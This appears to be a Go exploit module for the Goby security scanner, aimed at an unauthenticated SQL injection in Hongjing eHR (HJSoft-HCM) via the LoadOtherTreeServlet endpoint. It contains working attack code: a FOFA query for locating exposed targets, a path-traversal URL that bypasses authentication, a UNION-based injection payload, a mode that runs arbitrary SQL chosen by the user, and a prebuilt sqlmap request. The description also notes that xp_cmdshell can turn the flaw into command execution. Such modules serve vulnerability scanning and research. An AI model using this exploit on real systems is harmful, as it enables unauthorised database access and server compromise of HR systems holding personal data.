package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HJSoft-HCM /LoadOtherTreeServlet SQL Injection Vulnerability",
    "Description": "<p>Hongjing eHR human resource management software is a software that integrates human resource management and digital applications to meet the needs of dynamic, collaborative, process-oriented and strategic. </p><p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell to execute arbitrary commands. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2024-07-04",
    "PostTime": "2024-10-28",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "GobyQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "Level": "1",
    "Impact": "<p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell to execute arbitrary commands. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/140179591"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /LoadOtherTreeServlet SQL 注入漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。</p><p>宏景eHR LoadOtherTreeServlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>宏景eHR LoadOtherTreeServlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "HJSoft-HCM /LoadOtherTreeServlet SQL Injection Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>Hongjing eHR human resource management software is a software that integrates human resource management and digital applications to meet the needs of dynamic, collaborative, process-oriented and strategic.&nbsp;</p><p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell to execute arbitrary commands. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell to execute arbitrary commands. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	setSqlPayloadHashashfcghaghfdyagufdheqhfgutgkwetgftyzbsdvctasfdyqagdfyqhwbeftegqwtfutgyqtefsdcgtyu := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `-1) UNION ALL SELECT 90,CHAR(104)+CHAR(106)+CHAR(112)+(`+sql+`),90,90--`
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?modelflag=4&flag=1&budget_id=" + sql)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qvjxqmQo"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113)+CHAR(109)+CHAR(81)+CHAR(111)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `text="hjp([\s\S]*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashashfcghaghfdyagufdheqhfgutgkwetgftyzbsdvctasfdyqagdfyqhwbeftegqwtfutgyqtefsdcgtyu
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&flag=1&budget_id=%2d%31%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%39%30%2c%43%48%41%52%28%31%30%34%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%31%32%29%2b%28%73%65%6c%65%63%74%20%27%31%27%29%2c%39%30%2c%39%30%2d%2d HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `text="hjp([\s\S]*?)"`


			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashashfcghaghfdyagufdheqhfgutgkwetgftyzbsdvctasfdyqagdfyqhwbeftegqwtfutgyqtefsdcgtyu
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
